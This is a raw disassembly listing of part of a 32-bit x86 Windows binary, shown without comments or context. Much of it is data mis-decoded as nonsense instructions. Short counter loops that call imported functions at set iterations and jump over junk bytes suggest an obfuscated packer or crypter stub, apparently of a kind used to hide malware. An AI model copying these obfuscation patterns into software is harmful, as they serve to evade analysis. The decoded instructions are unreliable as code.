  406f58:	rcr    BYTE PTR [bx+di+0x53],0xa
  406f5d:	xchg   esi,eax
  406f5e:	sti    
  406f5f:	cmp    DWORD PTR [edi+0x4da51bf6],ebp
  406f65:	stc    
  406f66:	or     al,0x66
  406f68:	or     ebp,esp
  406f6a:	vpaddq ymm2,ymm6,YMMWORD PTR [esi+0x7c]
  406f6f:	int    0xad
  406f71:	mov    ebx,0xb12f63b8
  406f76:	int    0x2e
  406f78:	icebp  
  406f79:	(bad)  
  406f7a:	out    dx,eax
  406f7b:	inc    ebp
  406f7c:	sub    al,0x9b
  406f7e:	in     eax,0x19
  406f80:	pop    esp
  406f81:	jnp    0x406f51
  406f83:	int3   
  406f84:	cld    
  406f85:	mov    edi,0x366d182
  406f8a:	rcr    DWORD PTR [ebx],0xd
  406f8d:	loope  0x406f39
  406f8f:	inc    edx
  406f90:	add    BYTE PTR [edi],cl
  406f92:	mov    bh,0xc0
  406f94:	and    DWORD PTR ds:0x42aae5,0x0
  406f9e:	jmp    0x406fb0
  406fa3:	mov    ecx,DWORD PTR ds:0x42aae5
  406fa9:	inc    ecx
  406faa:	mov    DWORD PTR ds:0x42aae5,ecx
  406fb0:	cmp    DWORD PTR ds:0x42aae5,0x11
  406fb7:	jae    0x407009
  406fbd:	cmp    DWORD PTR ds:0x42aae5,0x7
  406fc4:	jne    0x406fe4
  406fca:	push   0x2396
  406fcf:	push   0x42ad82
  406fd4:	push   0x42ad82
  406fd9:	push   0x42ad64
  406fde:	call   DWORD PTR ds:0x41d190
  406fe4:	cmp    DWORD PTR ds:0x42aae5,0x6
  406feb:	jne    0x406ffe
  406ff1:	mov    ecx,DWORD PTR ds:0x42aae5
  406ff7:	inc    ecx
  406ff8:	mov    DWORD PTR ds:0x42aae5,ecx
  406ffe:	jmp    0x406fa3
  407003:	adc    DWORD PTR ds:0x42aa29,edx
  407009:	mov    DWORD PTR [ebp-0xc],eax
  40700c:	xor    ecx,ecx
  40700e:	add    ecx,DWORD PTR ds:0x42a9cd
  407014:	sub    DWORD PTR ds:0x42aaa1,ecx
  40701a:	jmp    0x407323
  40701f:	cmp    al,0xc4
  407021:	(bad)  
  407022:	rcl    dh,cl
  407024:	rol    ah,cl
  407026:	ficom  DWORD PTR [esi+ebp*2-0xc]
  40702a:	out    0xcf,al
  40702c:	repz push eax
  40702e:	push   esi
  40702f:	pop    eax
  407030:	int3   
  407031:	js     0x4070ab
  407033:	fs jle 0x4070ae
  407036:	js     0x407076
  407038:	ins    DWORD PTR es:[edi],dx
  407039:	add    dh,BYTE PTR [eax]
  40703b:	ss inc ebx
  40703d:	test   al,0x66
  40703f:	std    
  407040:	or     esp,DWORD PTR ds:0x5bdfc339
  407046:	ficom  WORD PTR [ebx]
  407048:	mov    dh,0xf4
  40704a:	cwde   
  40704b:	jl     0x407030
  40704d:	jno    0x40702d
  40704f:	or     ebx,edi
  407051:	inc    esi
  407052:	mov    ah,BYTE PTR [esi+0x54]
  407055:	add    ebp,DWORD PTR [edx+0x6c]
  407058:	stos   DWORD PTR es:[edi],eax
  407059:	es push 0x24
  40705c:	mov    ch,0xdc
  40705e:	xchg   ecx,eax
  40705f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407060:	adc    BYTE PTR [ecx],ah
  407062:	dec    edi
  407063:	retf   0x5eb3
  407066:	loopne 0x407078
  407068:	inc    esi
  407069:	inc    eax
  40706a:	scas   eax,DWORD PTR es:[edi]
  40706b:	std    
  40706c:	dec    esp
  40706d:	push   ecx
  40706e:	cmc    
  40706f:	push   es
  407070:	sub    BYTE PTR [esi-0x1bae8b9a],bh
  407076:	sahf   
  407077:	imul   ebx,edx,0xffffff9e
  40707a:	pop    ss
  40707b:	mov    BYTE PTR [esi-0x5c],dl
  40707e:	cmp    DWORD PTR [esi+0x302feb70],edx
  407084:	cmc    
  407085:	(bad)  
  407086:	mov    ebp,0x9f9ddf6e
  40708b:	inc    edx
  40708c:	daa    
  40708d:	sbb    eax,DWORD PTR [ebp-0x5e]
  407090:	xchg   esp,eax
  407091:	jbe    0x407058
  407093:	mov    DWORD PTR [ecx+0x1dbb0903],edi
  407099:	and    eax,0x2d5aa8f4
  40709e:	rcl    DWORD PTR [ebp-0x3bd55471],0xa6
  4070a5:	sti    
  4070a6:	in     eax,0x82
  4070a8:	and    al,0x59
  4070aa:	jmp    0xf8d99d92
  4070af:	loopne 0x4070d0
  4070b1:	mov    DWORD PTR [esi],ebx
  4070b3:	push   ss
  4070b4:	nop
  4070b5:	test   BYTE PTR [esi+eiz*2+0x5ece0178],ch
  4070bc:	test   eax,0xd867278b
  4070c1:	popa   
  4070c2:	push   eax
  4070c3:	or     ah,dl
  4070c5:	imul   BYTE PTR [edi+0x21]
  4070c8:	pop    es
  4070c9:	std    
  4070ca:	arpl   WORD PTR [ebx-0xbccc6da],ax
  4070d0:	rol    DWORD PTR [ebx+0x736dc7fe],1
  4070d6:	cmp    al,0xca
  4070d8:	loopne 0x4070e4
  4070da:	inc    edx
  4070db:	xchg   DWORD PTR [edx+0x4a],ebx
  4070de:	call   0xf07f:0xf06a2e98
  4070e5:	repnz pushw ds
  4070e8:	sbb    BYTE PTR [edx-0x21],bl
  4070eb:	dec    edx
  4070ec:	aas    
  4070ed:	mov    dh,0x92
  4070ef:	int3   
  4070f0:	inc    esp
  4070f1:	xchg   edx,eax
  4070f2:	sub    al,0x44
  4070f4:	push   ecx
  4070f5:	ss into 
  4070f7:	mov    ah,0xa5
  4070f9:	sub    esp,DWORD PTR [ebx]
  4070fb:	cmp    BYTE PTR [edi],dl
  4070fd:	adc    eax,0x559077f0
  407102:	inc    ecx
  407103:	ins    BYTE PTR es:[edi],dx
  407104:	or     DWORD PTR [ebp+0x675176ca],edx
  40710a:	inc    eax
  40710b:	dec    ecx
  40710c:	xchg   ebp,eax
  40710d:	std    
  40710e:	(bad)  
  40710f:	push   ebx
  407110:	out    dx,eax
  407111:	or     eax,0xe185f1ad
  407116:	mov    dh,0x9
  407118:	retf   0x9e95
  40711b:	cmp    BYTE PTR [edi],ch
  40711d:	jmp    0x407103
  40711f:	xchg   ebx,eax
  407120:	aad    0x9
  407122:	inc    esp
  407123:	cmp    ebx,0x885cbf19
  407129:	xchg   esp,eax
  40712a:	rol    ebx,1
  40712c:	push   esp
  40712d:	xor    al,0x15
  40712f:	pushf  
  407130:	lds    edx,FWORD PTR [esi-0x54]
  407133:	ins    BYTE PTR es:[edi],dx
  407134:	pop    ebx
  407135:	mov    edi,0xb3c30cc2
  40713a:	mov    BYTE PTR [edx+0x38],al
  40713d:	inc    edi
  40713e:	leave  
  40713f:	dec    ecx
  407140:	or     edx,esp
  407142:	ins    BYTE PTR es:[edi],dx
  407143:	mov    WORD PTR [ecx],es
  407145:	and    BYTE PTR [eax],0xfe
  407148:	cmp    eax,0x7f981a97
  40714d:	pop    ds
  40714e:	inc    ebx
  40714f:	and    DWORD PTR [ebp+0x5e],edi
  407152:	add    edi,DWORD PTR [ebp-0x3ce02d8f]
  407158:	cmp    BYTE PTR [eax+eiz*4+0x50],ah
  40715c:	or     BYTE PTR [ebx+0x3cfea29d],0xf3
  407163:	mov    ah,0x43
  407165:	fimul  WORD PTR [ebx-0x20803da3]
  40716b:	lds    eax,FWORD PTR [eax+0x40d42759]
  407171:	test   al,0xa1
  407173:	fcomp  DWORD PTR [ebp-0x4b]
  407176:	pop    es
  407177:	jne    0x4071f7
  407179:	cmc    
  40717a:	add    esp,0xffffff9d
  40717d:	push   0x6c333f6d
  407182:	and    DWORD PTR [ecx-0x21],esi
  407185:	out    0x67,eax
  407187:	push   edx
  407188:	stos   BYTE PTR es:[edi],al
  407189:	js     0x407199
  40718b:	jge    0x40718e
  40718d:	push   edx
  40718e:	xchg   esi,eax
  40718f:	sub    eax,0x3dcf969e
  407194:	mov    al,ds:0x477b1d62
  407199:	mov    ds:0xe969c035,al
  40719e:	sbb    al,0x7f
  4071a0:	je     0x40712e
  4071a2:	test   eax,0xbd45b4d7
  4071a7:	push   ebp
  4071a8:	les    ebx,FWORD PTR [ecx+0x13ef9049]
  4071ae:	jae    0x407182
  4071b0:	add    eax,0xaa6aae7c
  4071b5:	jns    0x40722f
  4071b7:	jmp    0x40720d
  4071b9:	jbe    0x40716e
  4071bb:	jle    0x4071ff
  4071bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071be:	cdq    
  4071bf:	or     BYTE PTR [edi-0x3e],cl
  4071c2:	sysexit 
  4071c4:	or     BYTE PTR [edi],dl
  4071c6:	sahf   
  4071c7:	dec    ecx
  4071c8:	dec    ebx
  4071c9:	fnsave ds:0x6d9a7b8f
  4071cf:	mov    al,0xc9
  4071d1:	add    BYTE PTR [edi+0x5d],dh
  4071d4:	push   esp
  4071d5:	inc    esi
  4071d6:	jnp    0x4071dd
  4071d8:	mov    esp,ebp
  4071da:	mov    eax,0xdba4ddc5
  4071df:	cmp    bl,BYTE PTR cs:[esi-0x5e]
  4071e3:	mov    BYTE PTR [eax],dh
  4071e5:	inc    esp
  4071e6:	fs add ebx,edx
  4071e9:	dec    ebp
  4071ea:	fcmovne st,st(3)
  4071ec:	and    DWORD PTR [ecx],ecx
  4071ee:	scas   eax,DWORD PTR es:[edi]
  4071ef:	icebp  
  4071f0:	jl     0x40725c
  4071f2:	int    0x5
  4071f4:	dec    ebx
  4071f5:	iret   
  4071f6:	ins    DWORD PTR es:[edi],dx
  4071f7:	xor    DWORD PTR [eax],ebx
  4071f9:	enter  0x4a17,0xe7
  4071fd:	iret   
  4071fe:	mov    edi,0x360d1ae4
  407203:	imul   edx,DWORD PTR [edx-0x26],0xffffffec
  407207:	and    al,0xf2
  407209:	shl    BYTE PTR [esp+ecx*1+0x12527174],1
  407210:	std    
  407211:	or     esi,DWORD PTR [edi-0x17]
  407214:	or     BYTE PTR [ebx-0x18d8dc0a],al
  40721a:	push   ss
  40721b:	mov    ds:0x1c2e9efe,eax
  407220:	dec    ecx
  407221:	ds inc ebx
  407223:	add    eax,0xb0e0c32e
  407228:	call   0xb624581d
  40722d:	add    al,0xe2
  40722f:	fstp   TBYTE PTR [edx+0x65]
  407232:	jecxz  0x407268
  407234:	aam    0xc5
  407236:	test   eax,0x9532670
  40723b:	popa   
  40723c:	bnd jbe 0x407201
  40723f:	jno    0x407299
  407241:	adc    BYTE PTR [edi+0x766eec17],bl
  407247:	fstp   QWORD PTR [eax-0x1b]
  40724a:	jno    0x407253
  40724c:	addr16 dec ebp
  40724e:	push   ss
  40724f:	sub    edx,DWORD PTR [eax+0x48]
  407252:	psrad  mm4,QWORD PTR [eax-0x4576a1f6]
  407259:	cmp    al,0x2e
  40725b:	mov    edi,0xef51770a
  407260:	xor    al,0xfe
  407262:	xchg   esi,eax
  407263:	mov    ds:0xb57ad1b8,eax
  407268:	icebp  
  407269:	shr    DWORD PTR [ecx+0x75541cc3],0xc
  407270:	inc    ebx
  407271:	jns    0x407287
  407273:	dec    ebx
  407274:	call   0xf27a:0x6bb6a7ae
  40727b:	ja     0x4072c1
  40727d:	or     eax,0x2489af02
  407282:	or     eax,0xa4aabd8
  407287:	leave  
  407288:	pop    ebx
  407289:	or     ch,BYTE PTR [edi-0x58f050e3]
  40728f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407290:	aad    0x8b
  407292:	mov    dl,0xed
  407294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407295:	popa   
  407296:	dec    ebx
  407297:	add    ebx,DWORD PTR [ebx]
  407299:	out    dx,eax
  40729a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40729b:	mov    eax,0x4173e30f
  4072a0:	dec    esi
  4072a1:	xor    eax,0x3280460c
  4072a6:	pop    DWORD PTR [eax+eiz*4]
  4072a9:	xor    al,0x57
  4072ab:	mov    WORD PTR [eax+0x68],?
  4072ae:	ror    BYTE PTR [esi-0x1404f02b],0xc2
  4072b5:	mov    bl,0x7a
  4072b7:	pop    ebp
  4072b8:	(bad)  
  4072b9:	and    eax,0x892c66e9
  4072be:	cmp    al,0x79
  4072c0:	adc    cl,BYTE PTR [eax]
  4072c2:	push   edi
  4072c3:	sbb    ecx,DWORD PTR [ebx+0x37]
  4072c6:	dec    edi
  4072c7:	leave  
  4072c8:	std    
  4072c9:	sub    bh,BYTE PTR [esi+0x4a]
  4072cc:	test   ebp,ebx
  4072ce:	xchg   DWORD PTR [edi-0xb],edx
  4072d1:	mov    dh,0xed
  4072d3:	inc    esi
  4072d4:	dec    edx
  4072d5:	xlat   BYTE PTR ds:[ebx]
  4072d6:	mov    bh,0x2b
  4072d8:	fld    QWORD PTR [esi-0x18]
  4072db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072dc:	mov    bl,BYTE PTR [ecx+0x3570ff06]
  4072e2:	retf   
  4072e3:	xor    dl,BYTE PTR [edi+ebx*4+0x2934dcc]
  4072ea:	mov    ah,0x81
  4072ec:	sub    al,0x39
  4072ee:	mov    ds:0xc745641a,eax
  4072f3:	idiv   esp
  4072f5:	ret    
  4072f6:	mov    ch,0x4
  4072f8:	sbb    ecx,DWORD PTR [ecx+edx*8+0x24a248c6]
  4072ff:	jle    0x4072b2
  407301:	push   esp
  407302:	daa    
  407303:	shl    ebx,0x6c
  407306:	mov    al,0x82
  407308:	push   ss
  407309:	dec    ebx
  40730a:	sub    DWORD PTR fs:[esi+0x71],edi
  40730e:	(bad)  
  40730f:	cmp    ch,bl
  407311:	rcl    DWORD PTR [ebx],cl
  407313:	imul   ebp,DWORD PTR [ecx-0x424931c3],0xfd28e0e1
  40731d:	mov    esp,0x768349c1
  407322:	out    dx,al
  407323:	mov    BYTE PTR [ebp-0x1],0x7f
  407327:	lea    eax,[ebp-0x1]
  40732a:	and    DWORD PTR ds:0x42a9d9,0x0
  407334:	jmp    0x407346
  407339:	mov    ecx,DWORD PTR ds:0x42a9d9
  40733f:	inc    ecx
  407340:	mov    DWORD PTR ds:0x42a9d9,ecx
  407346:	cmp    DWORD PTR ds:0x42a9d9,0x14
  40734d:	jae    0x4076a2
  407353:	cmp    DWORD PTR ds:0x42a9d9,0x4
  40735a:	jne    0x407378
  407360:	push   0x42aae9
  407365:	push   0x360b
  40736a:	push   DWORD PTR [ebp-0x20]
  40736d:	push   0x8b40
  407372:	call   DWORD PTR ds:0x41d194
  407378:	cmp    DWORD PTR ds:0x42a9d9,0x3
  40737f:	jne    0x407394
  407385:	xor    ecx,ecx
  407387:	xor    ecx,DWORD PTR ds:0x42a9d9
  40738d:	inc    ecx
  40738e:	mov    DWORD PTR ds:0x42a9d9,ecx
  407394:	jmp    0x407339
  407399:	jmp    0x4076a2
  40739e:	iret   
  40739f:	retf   0xced7
  4073a2:	(bad)  
  4073a4:	aad    0xc9
  4073a6:	in     eax,0x5e
  4073a8:	mov    DWORD PTR ds:0x2e30a736,esp
  4073ae:	inc    esp
  4073af:	sar    DWORD PTR [eax+0x78],1
  4073b2:	fs jle 0x40742d
  4073b5:	js     0x4073ad
  4073b7:	fistp  QWORD PTR [edi]
  4073b9:	dec    esp
  4073ba:	push   ecx
  4073bb:	dec    esp
  4073bc:	or     eax,0xf506f49f
  4073c1:	sub    edx,ecx
  4073c3:	je     0x407347
  4073c5:	cmp    esi,edx
  4073c7:	popa   
  4073c8:	outs   dx,BYTE PTR ds:[esi]
  4073c9:	hlt    
  4073ca:	fs ins DWORD PTR es:[edi],dx
  4073cc:	cmp    esi,ebx
  4073ce:	jns    0x4073ad
  4073d0:	scas   eax,DWORD PTR es:[edi]
  4073d1:	pop    edi
  4073d2:	jns    0x4073be
  4073d4:	ss jmp 0x407442
  4073d7:	push   esp
  4073d8:	cmp    DWORD PTR [esi-0x7],edx
  4073db:	cli    
  4073dc:	adc    edi,ebp
  4073de:	lea    eax,[edi]
  4073e0:	sbb    eax,0xdcef403f
  4073e5:	push   ss
  4073e6:	xor    esp,DWORD PTR [ebp-0x75]
  4073e9:	jmp    0x407456
  4073eb:	cmp    ch,bl
  4073ed:	xchg   DWORD PTR [esi+0x56901b1],ebp
  4073f3:	dec    ebp
  4073f4:	inc    esi
  4073f5:	sti    
  4073f6:	iret   
  4073f7:	shl    BYTE PTR [eax+0x38e4e2b7],0x70
  4073fe:	sbb    bh,0xdf
  407401:	inc    ecx
  407402:	push   0x1692901f
  407407:	dec    ebp
  407408:	jno    0x40744a
  40740a:	jl     0x4073f9
  40740c:	jg     0x40739b
  40740e:	mov    edi,0x80bca488
  407413:	int3   
  407414:	js     0x40748c
  407416:	fs xchg edi,eax
  407418:	cwde   
  407419:	or     al,0x30
  40741b:	outs   dx,BYTE PTR ds:[esi]
  40741c:	jmp    0x4073bd
  40741e:	jge    0x407435
  407420:	lods   eax,DWORD PTR ds:[esi]
  407421:	cmp    BYTE PTR [ecx+0x277d317f],0x86
  407428:	mov    gs,WORD PTR [ebx+ecx*1-0x4cdd69aa]
  40742f:	gs cmp al,0x1
  407432:	out    dx,eax
  407433:	out    dx,al
  407434:	xchg   DWORD PTR [ecx],ecx
  407436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407437:	ins    BYTE PTR es:[edi],dx
  407438:	retf   
  407439:	xor    BYTE PTR [ebx+0x70],al
  40743c:	gs ins DWORD PTR es:[edi],dx
  40743e:	fs popf 
  407440:	jmp    0x407442
  407442:	xchg   edx,eax
  407443:	sbb    eax,0x246e40c0
  407448:	inc    edx
  407449:	ror    BYTE PTR [edi],1
  40744b:	cs push edx
  40744d:	sbb    DWORD PTR ds:0xc44dbced,ecx
  407453:	mov    dh,0xca
  407455:	in     eax,dx
  407456:	mov    ds:0xb688d34e,al
  40745b:	imul   esp,DWORD PTR [edi-0x2b],0x48
  40745f:	or     eax,0x3106b986
  407464:	popf   
  407465:	adc    DWORD PTR [edx+0xa],eax
  407468:	mov    esp,0xd3e65e61
  40746d:	(bad)  
  40746e:	xchg   edx,eax
  40746f:	fucom  st(2)
  407471:	ja     0x4074a1
  407473:	adc    eax,0xb88e4498
  407478:	call   0xb3c8:0xe9846b9a
  40747f:	xchg   edx,eax
  407480:	mov    cl,BYTE PTR [ebp-0x343050fd]
  407486:	pop    DWORD PTR [esi]
  407488:	mov    bh,0x87
  40748a:	adc    BYTE PTR [edi],dl
  40748c:	enter  0xcef,0xc0
  407490:	js     0x40749b
  407492:	pusha  
  407493:	test   DWORD PTR [ecx],0x7670023b
  407499:	push   ds
  40749a:	inc    ecx
  40749b:	pop    eax
  40749c:	fidivr WORD PTR [edi+ebx*8-0x4552154f]
  4074a3:	mov    esp,?
  4074a5:	push   cs
  4074a6:	jmp    0x4074f5
  4074a8:	daa    
  4074a9:	call   0x74c2:0x92179b44
  4074b0:	clc    
  4074b1:	pop    DWORD PTR [edx]
  4074b3:	out    dx,eax
  4074b4:	add    al,0x4b
  4074b6:	mov    WORD PTR [ebx+0x6c93b7c2],gs
  4074bc:	call   0x9ca9e412
  4074c1:	(bad)  
  4074c2:	dec    ebx
  4074c3:	mov    al,ds:0xba0e4ddc
  4074c8:	fist   WORD PTR ds:0xe4169fe5
  4074ce:	enter  0x94d4,0x9a
  4074d2:	mov    edi,0xd366d8f6
  4074d7:	push   ecx
  4074d8:	pop    ecx
  4074d9:	fdiv   DWORD PTR [ebp+esi*2+0x3068da86]
  4074e0:	sbb    DWORD PTR [ecx-0x4f581def],esp
  4074e6:	(bad)  
  4074e7:	je     0x4074b4
  4074e9:	or     BYTE PTR [ebx],bh
  4074eb:	jo     0x4074af
  4074ed:	sbb    DWORD PTR [ecx+edx*8],0xc91536b7
  4074f4:	pop    edi
  4074f5:	fmul   QWORD PTR [esi]
  4074f7:	out    0x75,eax
  4074f9:	mov    eax,ds:0x5dcdde7e
  4074fe:	lahf   
  4074ff:	jmp    0x6cf914ee
  407504:	cmp    al,BYTE PTR [ecx]
  407506:	inc    esp
  407507:	sahf   
  407508:	cmp    ebp,DWORD PTR [edi]
  40750a:	imul   ecx,esi,0x64
  40750d:	leave  
  40750e:	dec    ebx
  40750f:	push   edi
  407510:	cmp    al,0xcd
  407512:	cmp    al,0xe5
  407514:	lea    edi,[eax+0x6abd49ac]
  40751a:	scas   al,BYTE PTR es:[edi]
  40751b:	cbw    
  40751d:	iret   
  40751e:	push   ds
  40751f:	stc    
  407520:	pop    ebx
  407521:	aaa    
  407522:	fmul   st,st(5)
  407524:	(bad)
  407528:	jge    0x4074f9
  40752a:	jmp    0x3ddfc50b
  40752f:	sub    ah,BYTE PTR [edi+0x5b]
  407532:	xlat   BYTE PTR ds:[ebx]
  407533:	and    DWORD PTR [edi-0x1aac43a0],0x2
  40753a:	xchg   edx,esi
  40753c:	jne    0x40755c
  40753e:	das    
  40753f:	repnz ror BYTE PTR [edi+0x6c],0xb1
  407544:	cli    
  407545:	pop    ecx
  407546:	shr    BYTE PTR [ebx-0x1],1
  407549:	pop    esp
  40754a:	stc    
  40754b:	sbb    eax,0x1cea9570
  407550:	and    bl,bh
  407552:	jl     0x407543
  407554:	out    dx,al
  407555:	test   cl,bh
  407557:	pop    edx
  407558:	sub    BYTE PTR [edi-0x4f2387b4],cl
  40755e:	ret    0x4c69
  407561:	push   edi
  407562:	mov    edi,0xaf7facf9
  407567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407568:	int3   
  407569:	(bad)  
  40756a:	cld    
  40756b:	(bad)  
  40756c:	ds jl  0x40752d
  40756f:	test   DWORD PTR [ebx],ebx
  407571:	push   edx
  407572:	clc    
  407573:	mov    ecx,0x600984d
  407578:	pop    esi
  407579:	add    DWORD PTR [eax],ebx
  40757b:	test   al,0x1a
  40757d:	iret   
  40757e:	xor    ah,dl
  407580:	aad    0xff
  407582:	rcl    BYTE PTR [ebp+0x53],1
  407585:	loope  0x40753d
  407587:	pop    eax
  407588:	add    DWORD PTR [edx+0x95c1a92],0x565918c4
  407592:	stos   DWORD PTR es:[edi],eax
  407593:	cmp    al,0xbc
  407595:	sub    eax,0xfef696c2
  40759a:	js     0x40760e
  40759c:	fistp  DWORD PTR [esi+0x32]
  40759f:	xor    BYTE PTR [ebx-0x3ddb4abc],bh
  4075a5:	dec    ebp
  4075a6:	ret    
  4075a7:	mov    dl,0xfd
  4075a9:	sbb    BYTE PTR [eax],0x22
  4075ac:	cwde   
  4075ad:	fsubr  DWORD PTR [esi]
  4075af:	js     0x407626
  4075b1:	aas    
  4075b2:	mov    ah,0xcc
  4075b4:	clc    
  4075b5:	ret    0x3a32
  4075b8:	adc    DWORD PTR [edi+eiz*8-0x6a5e8fd6],0x42f466dd
  4075c3:	lods   eax,DWORD PTR ds:[esi]
  4075c4:	dec    BYTE PTR [esp+ebp*2]
  4075c7:	iret   
  4075c8:	lods   eax,DWORD PTR ds:[esi]
  4075c9:	mov    dl,BYTE PTR [eax-0x12]
  4075cc:	mov    eax,esi
  4075ce:	and    edx,eax
  4075d0:	xchg   esp,eax
  4075d1:	mov    ah,0x33
  4075d3:	cs inc edx
  4075d5:	in     eax,dx
  4075d6:	xor    DWORD PTR [ebp-0x1f],eax
  4075d9:	inc    ecx
  4075da:	push   eax
  4075db:	ss pop edi
  4075dd:	lods   al,BYTE PTR ds:[esi]
  4075de:	jmp    0x407633
  4075e0:	pop    esi
  4075e1:	mov    ebp,0x535dd23
  4075e6:	inc    ebp
  4075e7:	repnz retf 
  4075e9:	push   es
  4075ea:	or     BYTE PTR [eax],bh
  4075ec:	cmp    DWORD PTR [esi-0x30a40546],esp
  4075f2:	jno    0x4075eb
  4075f4:	popa   
  4075f5:	mov    edi,0xb52682a9
  4075fa:	pop    es
  4075fb:	and    esp,eax
  4075fd:	sbb    ebx,ecx
  4075ff:	sub    cl,BYTE PTR [ecx+ecx*4+0x53c570e]
  407606:	aam    0xa1
  407608:	enter  0x9cfb,0x8f
  40760c:	mov    al,ds:0xfd23174f
  407611:	or     al,0xb4
  407613:	std    
  407614:	xchg   ebx,eax
  407615:	(bad)  
  407616:	xchg   ecx,eax
  407617:	and    ecx,DWORD PTR [ebx]
  407619:	xchg   ecx,eax
  40761a:	ret    0xddcf
  40761d:	mov    esp,0xa1c2f04b
  407622:	pop    ecx
  407623:	nop
  407624:	sti    
  407625:	in     eax,dx
  407626:	sub    BYTE PTR [ebp+ebx*8+0x7],ch
  40762a:	mov    ds:0xd65ffcf3,eax
  40762f:	inc    edx
  407630:	int    0x28
  407632:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407633:	loopne 0x407641
  407635:	jno    0x407625
  407637:	pop    ebx
  407638:	xchg   esi,eax
  407639:	cmp    BYTE PTR [ebx+eax*1+0x67],0xc3
  40763e:	loope  0x407660
  407640:	cmp    eax,0xf5d1afba
  407645:	dec    edi
  407646:	mov    ds:0x62997776,eax
  40764b:	popa   
  40764c:	in     eax,dx
  40764d:	int3   
  40764e:	mov    ds:0xce26af07,al
  407653:	mov    cl,0xb6
  407655:	add    al,0x33
  407657:	xor    eax,0x40caeb56
  40765c:	push   edx
  40765d:	stos   BYTE PTR es:[edi],al
  40765e:	jns    0x40762d
  407660:	(bad)  
  407661:	icebp  
  407662:	out    dx,al
  407663:	mov    bh,0x2
  407665:	imul   ebp,DWORD PTR [ebx],0x3e981286
  40766b:	mov    bl,0x69
  40766d:	mov    edi,0x2c409f4c
  407672:	stos   BYTE PTR es:[edi],al
  407673:	pop    ebp
  407674:	xchg   ecx,eax
  407675:	add    edi,DWORD PTR [edi+0x51e4bb42]
  40767b:	loopne 0x4076b1
  40767d:	mov    ch,0xc2
  40767f:	sbb    ah,BYTE PTR [eax+0x1be9f35b]
  407685:	into   
  407686:	xchg   ebp,eax
  407687:	sbb    BYTE PTR [edi+0x24],0xd7
  40768b:	dec    eax
  40768c:	pop    edx
  40768d:	fdivr  DWORD PTR [esi-0x743b462f]
  407693:	int    0x4c
  407695:	or     al,al
  407697:	mov    cl,0x2a
  407699:	mov    bl,0xbb
  40769b:	push   es
  40769c:	cmp    BYTE PTR [edx+0x3f],bh
  40769f:	test   DWORD PTR [ebp-0x2f],ecx
  4076a2:	mov    DWORD PTR [ebp-0x10],eax
  4076a5:	mov    al,BYTE PTR [ebp-0x1]
  4076a8:	or     DWORD PTR ds:0x42a9c1,0x6cf8
  4076b2:	mov    ecx,DWORD PTR [ebp-0x10]
  4076b5:	xor    al,0x43
  4076b7:	sub    al,0x3b
  4076b9:	sbb    DWORD PTR ds:0x42aa9d,0x42a9dd
  4076c3:	mov    BYTE PTR [ecx],al
  4076c5:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  4076cc:	and    DWORD PTR ds:0x42aa19,0x0
  4076d6:	jmp    0x4076e8
  4076db:	mov    ecx,DWORD PTR ds:0x42aa19
  4076e1:	inc    ecx
  4076e2:	mov    DWORD PTR ds:0x42aa19,ecx
  4076e8:	cmp    DWORD PTR ds:0x42aa19,0x12
  4076ef:	jae    0x40772f
  4076f5:	cmp    DWORD PTR ds:0x42aa19,0xa
  4076fc:	jne    0x407710
  407702:	push   DWORD PTR [ebp-0xc]
  407705:	push   0x84c8
  40770a:	call   DWORD PTR ds:0x41d0c4
  407710:	cmp    DWORD PTR ds:0x42aa19,0x9
  407717:	jne    0x40772a
  40771d:	mov    ecx,DWORD PTR ds:0x42aa19
  407723:	inc    ecx
  407724:	mov    DWORD PTR ds:0x42aa19,ecx
  40772a:	jmp    0x4076db
  40772f:	mov    DWORD PTR [ebp-0x10],0xf89c8539
  407736:	mov    eax,DWORD PTR [ebp-0x8]
  407739:	mov    ecx,0x7510850
  40773e:	push   esi
  40773f:	xor    eax,ecx
  407741:	mov    esi,0x327298
  407746:	add    eax,esi
  407748:	jmp    0x407755
  40774d:	mov    dl,BYTE PTR [ebp-0x1]
  407750:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  407754:	inc    eax
  407755:	cmp    eax,0x40
  407758:	jb     0x40774d
  40775e:	mov    edx,DWORD PTR [ebp-0x8]
  407761:	mov    eax,DWORD PTR [ebp-0xc]
  407764:	xor    edx,ecx
  407766:	add    edx,esi
  407768:	cmp    edx,eax
  40776a:	je     0x407dc2
  407770:	push   ebx
  407771:	push   edi
  407772:	mov    edi,DWORD PTR [ebp+0x8]
  407775:	mov    eax,0x8a36
  40777a:	xor    ax,WORD PTR [edi+edx*4+0x2]
  40777f:	mov    edi,0x3afc
  407784:	jmp    0x407a8d
  407789:	cmp    al,0xc2
  40778b:	cmp    al,0xd3
  40778d:	ret    0xd3d1
  407790:	shl    DWORD PTR [edx-0x2e518918],1
  407796:	popf   
  407797:	cmp    al,ch
  407799:	mov    al,0xd6
  40779b:	js     0x407815
  40779d:	fs jle 0x407818
  4077a0:	js     0x407731
  4077a2:	lods   al,BYTE PTR ds:[esi]
  4077a3:	lods   al,BYTE PTR ds:[esi]
  4077a4:	xchg   esi,eax
  4077a5:	outs   dx,BYTE PTR ds:[esi]
  4077a6:	aad    0x52
  4077a8:	push   0x49
  4077aa:	int    0x90
  4077ac:	cmc    
  4077ad:	popf   
  4077ae:	mov    ds:0xa3845912,eax
  4077b3:	pop    eax
  4077b4:	fs xor BYTE PTR cs:[ebx],bh
  4077b8:	scas   eax,DWORD PTR es:[edi]
  4077b9:	(bad)  
  4077bb:	mov    ebp,0xea0983c
  4077c0:	dec    ebp
  4077c1:	scas   eax,DWORD PTR es:[edi]
  4077c2:	dec    ebp
  4077c3:	fiadd  WORD PTR [edi-0x6bc7ca27]
  4077c9:	pop    eax
  4077ca:	pop    ecx
  4077cb:	xchg   ecx,eax
  4077cc:	out    0xaa,eax
  4077ce:	rcl    BYTE PTR [esi+0x739b4e4],1
  4077d4:	not    DWORD PTR [edi+0x63]
  4077d7:	sbb    BYTE PTR [eax],dl
  4077d9:	sti    
  4077da:	cli    
  4077db:	sub    al,0xe0
